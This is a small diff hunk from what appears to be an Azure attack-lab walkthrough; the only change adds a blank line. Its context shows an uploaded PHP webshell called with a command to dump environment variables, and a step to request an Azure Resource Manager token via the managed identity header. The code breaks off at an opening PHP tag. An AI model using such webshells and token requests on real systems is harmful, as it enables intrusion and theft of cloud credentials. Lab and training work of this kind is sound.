@@ -372,6 +372,7 @@ Now we can navigate to:
 https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env
 ```
 •  If the app service contains environment variables IDENTITY_HEADER and IDENTITY_ENDPOINT, it has a **managed identity**.
+
 • and then we can request an ARM toke by passing the IDENTITY_HEADER using curl in php webshell:
 ```
 <?php 
